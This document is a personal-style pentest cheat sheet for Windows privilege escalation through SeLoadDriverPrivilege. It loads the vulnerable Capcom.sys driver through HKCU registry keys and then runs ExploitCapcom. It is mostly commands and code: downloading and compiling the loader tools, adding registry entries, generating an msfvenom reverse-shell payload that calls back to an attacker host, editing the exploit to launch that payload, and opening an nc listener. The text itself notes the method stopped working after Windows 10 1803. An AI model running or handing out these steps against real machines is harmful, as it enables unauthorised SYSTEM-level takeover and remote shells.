> Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".

## Check privilege

You must have `SeLoadDriverPrivilege`. If not, do UAC bypass [UACMe](https://github.com/hfiref0x/UACME) or if on a GUI, run with administrator privilege

```cmd
whoami /priv
```

## Load `Capcom.sys`

### Manual

This driver allows code execution. We use [this tool](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) to load it.

First, download the tool

```sh
wget https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp
```

Replace all the `#include` headers with these instead

```c
##include <windows.h>
##include <assert.h>
##include <winternl.h>
##include <sddl.h>
##include <stdio.h>
##include "tchar.h"
```

Then we compile it using **cl.exe** from Visual Studio 2019 Developer Command Prompt

```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

Then we download the `Capcom.sys` driver, transfer to target machine

```sh
wget https://github.com/FuzzySecurity/Capcom-Rootkit/raw/refs/heads/master/Driver/Capcom.sys
```

Create a reference to the `capcom.sys` driver's path. Change the path btw

```cmd-session
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

Load `capcom.sys`

```cmd
EnableSeLoadDriverPrivilege.exe
```

### Automated

[Github Page](https://github.com/TarlogicSecurity/EoPLoadDriver/)

I don't wanna compile shits on windows...

Download, compile

```sh
curl https://github.com/TarlogicSecurity/EoPLoadDriver/raw/refs/heads/master/eoploaddriver.cpp -o eoploaddriver.cpp
cl /DUNICODE /D_UNICODE eoploaddriver.cpp
```

Load driver (you need to download [`capcom.sys`](https://github.com/FuzzySecurity/Capcom-Rootkit/raw/refs/heads/master/Driver/Capcom.sys) first), also change the `capcom.sys` path

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

## Check if `capcom.sys` is loaded

Download [DriverView](https://www.nirsoft.net/utils/driverview.html) and transfer it to target machine

```sh
wget https://www.nirsoft.net/utils/driverview-x64.zip
unzip driverview-x64.zip
```

Then we find the capcom driver

```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

## Download and compile `ExploitCapcom`

noooooooooooooooooooooo I dont wanna compile shits on windows aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Do it yourself: [Github Page](https://github.com/tandasat/ExploitCapcom)

If you are not on a GUI session, generate a `msfvenom` payload, transfer to target machine

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o revshell.exe
```

Edit the `ExploitCapcom.cpp` code from `"C:\\Windows\\system32\\cmd.exe"` to the reverse shell executable path

```cpp
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

Stand up a `nc` listener

```sh
nc -nvlp 4444
```

Exploit

```cmd
.\ExploitCapcom.exe
```